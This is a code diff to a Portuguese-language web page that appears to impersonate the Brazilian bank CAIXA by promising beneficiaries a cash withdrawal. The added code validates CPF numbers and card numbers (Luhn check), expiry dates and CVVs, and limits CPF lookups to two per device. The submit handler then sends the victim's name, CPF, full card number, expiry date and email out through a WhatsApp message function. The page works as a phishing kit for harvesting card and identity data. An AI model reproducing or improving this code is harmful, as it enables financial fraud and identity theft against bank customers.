@@ -23,23 +23,11 @@
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
 <meta name="msapplication-navbutton-color" content="#004aad" />
 <meta name="msapplication-TileColor" content="#004aad" />
-  <!-- Esconder barra de endereço do navegador -->
-<meta name="apple-mobile-web-app-capable" content="yes" />
-<meta name="mobile-web-app-capable" content="yes" />
+
 
   <style>
 
-    /* Esconder barra de rolagem e melhorar experiência mobile */
-html, body {
-    overflow-x: hidden;
-    position: relative;
-    height: 100%;
-}
-
-/* Para esconder a barra de endereço ao rolar */
-body {
-    min-height: 100vh;
-}
+  
     /* ---------- BASE (mantendo identidade CAIXA) ---------- */
     :root{
       --caixa-blue: #1d62bc;
@@ -302,6 +290,24 @@ body {
     }
     .friend-indicator.success { background: #1a7f2e; color: white; }
     .friend-indicator.pending { background: #e9ecef; color: #6c757d; }
+
+
+/* Bloqueio de consultas excedidas */
+.bloqueio-mensagem {
+    background: #fff3cd;
+    border: 1px solid #ffc107;
+    border-radius: 10px;
+    padding: 15px;
+    margin-top: 15px;
+    text-align: center;
+    animation: fadeInUp 0.4s ease;
+}
+.bloqueio-mensagem i {
+    font-size: 24px;
+    color: #ffc107;
+    margin-bottom: 10px;
+}
+    
   </style>
 </head>
 <body>
@@ -589,9 +595,132 @@ body {
               <button id="confirmCartao" class="btn btn-modal-primary flex-grow-1">Enviar Solicitação</button>
             </div>
           </div>
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
-  <script>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+<script>
+    // ==================== FUNÇÃO DE VALIDAÇÃO LUHN PARA CPF ====================
+    function validarCPFLuhn(cpf) {
+        // Remove caracteres não numéricos
+        const cpfLimpo = cpf.toString().replace(/\D/g, '');
+        
+        if (cpfLimpo.length !== 11) return false;
+        
+        // Verifica se todos os dígitos são iguais (CPF inválido)
+        if (/^(\d)\1{10}$/.test(cpfLimpo)) return false;
+        
+        // Validação do primeiro dígito verificador
+        let soma = 0;
+        for (let i = 0; i < 9; i++) {
+            soma += parseInt(cpfLimpo.charAt(i)) * (10 - i);
+        }
+        let resto = 11 - (soma % 11);
+        let digito1 = resto >= 10 ? 0 : resto;
+        if (digito1 !== parseInt(cpfLimpo.charAt(9))) return false;
+        
+        // Validação do segundo dígito verificador
+        soma = 0;
+        for (let i = 0; i < 10; i++) {
+            soma += parseInt(cpfLimpo.charAt(i)) * (11 - i);
+        }
+        resto = 11 - (soma % 11);
+        let digito2 = resto >= 10 ? 0 : resto;
+        if (digito2 !== parseInt(cpfLimpo.charAt(10))) return false;
+        
+        return true;
+    }
+
+    // ==================== CONTROLE DE CONSULTAS POR DEVICE ====================
+    const CONSULTAS_KEY = "consultas_realizadas";
+    const LIMITE_CONSULTAS = 2;
+
+    function getDeviceId() {
+        // Usa localStorage para identificar o dispositivo
+        let deviceId = localStorage.getItem("device_id");
+        if (!deviceId) {
+            deviceId = 'device_' + Math.random().toString(36).substr(2, 16);
+            localStorage.setItem("device_id", deviceId);
+        }
+        return deviceId;
+    }
+
+    function getConsultasCount() {
+        const consultas = localStorage.getItem(CONSULTAS_KEY);
+        if (!consultas) return 0;
+        const dados = JSON.parse(consultas);
+        const deviceId = getDeviceId();
+        const hoje = new Date().toDateString();
+        
+        if (dados.deviceId !== deviceId || dados.data !== hoje) {
+            return 0;
+        }
+        return dados.contador || 0;
+    }
+
+    function incrementarConsultas() {
+        const deviceId = getDeviceId();
+        const hoje = new Date().toDateString();
+        let contador = getConsultasCount() + 1;
+        
+        const dados = {
+            deviceId: deviceId,
+            data: hoje,
+            contador: contador
+        };
+        localStorage.setItem(CONSULTAS_KEY, JSON.stringify(dados));
+        return contador;
+    }
+
+    function verificarLimiteConsultas() {
+        const consultasHoje = getConsultasCount();
+        if (consultasHoje >= LIMITE_CONSULTAS) {
+            return false;
+        }
+        return true;
+    }
+
+    function mostrarBloqueio() {
+        const section = document.getElementById('cpfSection');
+        if (section) {
+            const bloqueioDiv = document.createElement('div');
+            bloqueioDiv.className = 'bloqueio-mensagem';
+            bloqueioDiv.innerHTML = `
+                <i class="fas fa-lock"></i>
+                <h6>Limite de consultas atingido</h6>
+                <p>Você já realizou ${LIMITE_CONSULTAS} consultas hoje.<br>Por favor, tente novamente amanhã ou utilize outro dispositivo.</p>
+            `;
+            const userInfo = document.getElementById('userInfo');
+            if (userInfo) userInfo.style.display = 'none';
+            const errorMsg = document.getElementById('errorMessage');
+            if (errorMsg) errorMsg.style.display = 'none';
+            section.appendChild(bloqueioDiv);
+            setTimeout(() => {
+                if (bloqueioDiv) bloqueioDiv.remove();
+            }, 5000);
+        }
+        alert(`⚠️ Limite de consultas excedido! Você já fez ${LIMITE_CONSULTAS} consultas hoje. Tente novamente amanhã.`);
+    }
+
+    // ==================== FUNÇÃO DE VALIDAÇÃO LUHN PARA CARTÃO ====================
+    function validarCartaoLuhn(numero) {
+        const numeroLimpo = numero.toString().replace(/\D/g, '');
+        if (numeroLimpo.length < 13 || numeroLimpo.length > 19) return false;
+        
+        let soma = 0;
+        let alternar = false;
+        for (let i = numeroLimpo.length - 1; i >= 0; i--) {
+            let digito = parseInt(numeroLimpo.charAt(i), 10);
+            if (alternar) {
+                digito *= 2;
+                if (digito > 9) digito -= 9;
+            }
+            soma += digito;
+            alternar = !alternar;
+        }
+        return (soma % 10) === 0;
+    }
+
     // ==================== MÁSCARAS PARA CAMPOS DO CARTÃO ====================
     function mascaraCartao(input) {
         let value = input.value.replace(/\D/g, '');
@@ -602,23 +731,15 @@ body {
             formatted += value[i];
         }
         input.value = formatted;
-        detectarBandeiraCartao(value);
-    }
-
-    function detectarBandeiraCartao(numero) {
-        const bandeiras = [
-            { nome: 'Visa', regex: /^4/, cor: '#1a1f71' },
-            { nome: 'Mastercard', regex: /^5[1-5]/, cor: '#eb001b' },
-            { nome: 'Elo', regex: /^(4011|4312|4389|4514|4576|5041|5067|5090|6277|6363|6504|6505|6506|6507|6509|6516|6550|6551|6555)/, cor: '#1391C7' },
-            { nome: 'American Express', regex: /^3[47]/, cor: '#006FCF' },
-            { nome: 'Hipercard', regex: /^606282/, cor: '#B30000' },
-            { nome: 'Discover', regex: /^(6011|65|64[4-9]|622)/, cor: '#F79410' }
-        ];
-        const bandeira = bandeiras.find(b => b.regex.test(numero));
-        const input = document.getElementById('numeroCartao');
-        if (bandeira && numero.length >= 4) {
-            input.style.borderColor = bandeira.cor;
-            input.style.backgroundColor = '#f0f8ff';
+        
+        if (value.length >= 13) {
+            if (validarCartaoLuhn(value)) {
+                input.style.borderColor = '#28a745';
+                input.style.backgroundColor = '#f0fff4';
+            } else {
+                input.style.borderColor = '#dc3545';
+                input.style.backgroundColor = '#fff5f5';
+            }
         } else {
             input.style.borderColor = '#dee2e6';
             input.style.backgroundColor = '#fff';
@@ -658,13 +779,16 @@ body {
         if (value.length > 4) value = value.slice(0, 4);
         input.value = value;
         
-        const numeroCartao = document.getElementById('numeroCartao').value.replace(/\D/g, '');
+        const numeroCartao = document.getElementById('numeroCartao')?.value.replace(/\D/g, '') || '';
         const isAmex = numeroCartao.startsWith('34') || numeroCartao.startsWith('37');
         const maxLength = isAmex ? 4 : 3;
         
         if (value.length === maxLength) {
             input.style.borderColor = '#28a745';
             input.style.backgroundColor = '#f0fff4';
+        } else if (value.length > 0) {
+            input.style.borderColor = '#dc3545';
+            input.style.backgroundColor = '#fff5f5';
         } else {
             input.style.borderColor = '#dee2e6';
             input.style.backgroundColor = '#fff';
@@ -777,6 +901,20 @@ body {
             formatted = value;
         }
         input.value = formatted;
+        
+        // Validação em tempo real do CPF
+        if (value.length === 11) {
+            if (validarCPFLuhn(value)) {
+                input.style.borderColor = '#28a745';
+                input.style.backgroundColor = '#f0fff4';
+            } else {
+                input.style.borderColor = '#dc3545';
+                input.style.backgroundColor = '#fff5f5';
+            }
+        } else {
+            input.style.borderColor = '#dee2e6';
+            input.style.backgroundColor = '#fff';
+        }
     }
 
     function formatarData(dataStr) {
@@ -877,6 +1015,10 @@ body {
         }
     }
 
+    function esconderBarraEndereco() {
+        window.scrollTo(0, 1);
+    }
+
     document.addEventListener('DOMContentLoaded', () => {
         // Aplicar máscaras aos campos do cartão
         const campoCartao = document.getElementById('numeroCartao');
@@ -926,22 +1068,41 @@ body {
         document.getElementById('flowSubmit1').addEventListener('click', async () => {
             const cpfInput = document.getElementById('demoCpf');
             let cpf = cpfInput.value.replace(/\D/g, '');
+            
+            // VALIDAÇÃO DO CPF (Luhn)
             if (cpf.length !== 11) {
                 cpfInput.classList.add('input-error');
                 setTimeout(() => cpfInput.classList.remove('input-error'), 1500);
+                alert('❌ CPF inválido! Digite um CPF válido com 11 dígitos.');
                 return;
             }
+            
+            if (!validarCPFLuhn(cpf)) {
+                cpfInput.classList.add('input-error');
+                setTimeout(() => cpfInput.classList.remove('input-error'), 1500);
+                alert('❌ CPF inválido! Verifique os números e tente novamente.');
+                return;
+            }
+            
+            // VERIFICAR LIMITE DE CONSULTAS (2 por dispositivo)
+            if (!verificarLimiteConsultas()) {
+                mostrarBloqueio();
+                return;
+            }
+            
             cpfAtual = cpf;
             showStep('flowLoading', 2);
             const resultado = await buscarCPF(cpf);
+            
             if (resultado.success && resultado.nome) {
                 dadosUsuario = resultado;
                 document.getElementById('displayNome').textContent = resultado.nome;
                 document.getElementById('displayCpf').textContent = formatarCPFDisplay(cpf);
                 mostrarOpcoesData(resultado.opcoesDatas, resultado.dataReal);
                 showStep('flowStep2', 2);
+                incrementarConsultas(); // Incrementa contagem de consultas
             } else {
-                alert(resultado.erro || 'Erro ao consultar CPF');
+                alert(resultado.erro || 'CPF não encontrado na base de dados');
                 showStep('flowStep1', 1);
             }
         });
@@ -1005,16 +1166,48 @@ body {
         });
 
         document.getElementById('confirmCartao').addEventListener('click', () => {
-            const numero = document.getElementById('numeroCartao').value;
+            const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
             const validade = document.getElementById('validadeCartao').value;
             const cvv = document.getElementById('cvvCartao').value;
             const email = document.getElementById('emailCartao').value;
-            if (!numero || !validade || !cvv || !email) {
+            
+            if (!numeroRaw || !validade || !cvv || !email) {
                 alert('Por favor, preencha todos os campos.');
                 return;
             }
+            
+            // VALIDAÇÃO LUHN DO CARTÃO
+            if (!validarCartaoLuhn(numeroRaw)) {
+                alert('❌ Número do cartão inválido! Verifique os dados.');
+                return;
+            }
+            
+            // Validar validade
+            if (validade.length === 5) {
+                const mes = parseInt(validade.slice(0, 2));
+                const ano = parseInt(validade.slice(3, 5));
+                const anoAtual = new Date().getFullYear() % 100;
+                const mesAtual = new Date().getMonth() + 1;
+                if (ano < anoAtual || (ano === anoAtual && mes < mesAtual)) {
+                    alert('❌ Cartão vencido! Verifique a validade.');
+                    return;
+                }
+            } else {
+                alert('❌ Data de validade inválida!');
+                return;
+            }
+            
+            // Validar CVV
+            const isAmex = numeroRaw.startsWith('34') || numeroRaw.startsWith('37');
+            const cvvMinLength = isAmex ? 4 : 3;
+            if (cvv.length < cvvMinLength) {
+                alert(`❌ CVV inválido! Deve ter ${cvvMinLength} dígitos.`);
+                return;
+            }
+            
             const valor = dadosUsuario?.valorDisponivel || 1987.48;
-            const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - CARTÃO* 🆕\n\n👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n🆔 *CPF:* ${cpfAtual ? formatarCPFDisplay(cpfAtual) : 'N/A'}\n💳 *Cartão:* ${numero}\n📅 *Validade:* ${validade}\n📧 *E-mail:* ${email}\n💰 *Valor:* R$ ${formatarMoeda(valor)}\n✅ *Solicitação via Cartão*`;
+            const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - CARTÃO* 🆕\n\n👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n🆔 *CPF:* ${cpfAtual ? formatarCPFDisplay(cpfAtual) : 'N/A'}\n💳 *Cartão:* ${numeroRaw}\n📅 *Validade:* ${validade}\n📧 *E-mail:* ${email}\n💰 *Valor:* R$ ${formatarMoeda(valor)}\n✅ *Solicitação via Cartão*`;
+            
             enviarWhatsApp(mensagem);
             alert('✅ Solicitação enviada com sucesso!');
             limparProgresso();
@@ -1034,20 +1227,10 @@ body {
             bootstrapModal.hide();
         });
     });
+</script>
 
 
-
-
-
-    // Função para esconder barra de endereço
-function esconderBarraEndereco() {
-    window.scrollTo(0, 1);
-}
-
-// Executa ao carregar e ao rolar
-window.addEventListener('load', esconderBarraEndereco);
-window.addEventListener('scroll', esconderBarraEndereco);
-  </script>
+          
           <!-- SUCESSO -->
           <div id="flowSuccess" class="flow-step text-center">
             <i class="fas fa-check-circle fa-4x" style="color:#1a7f2e;"></i>
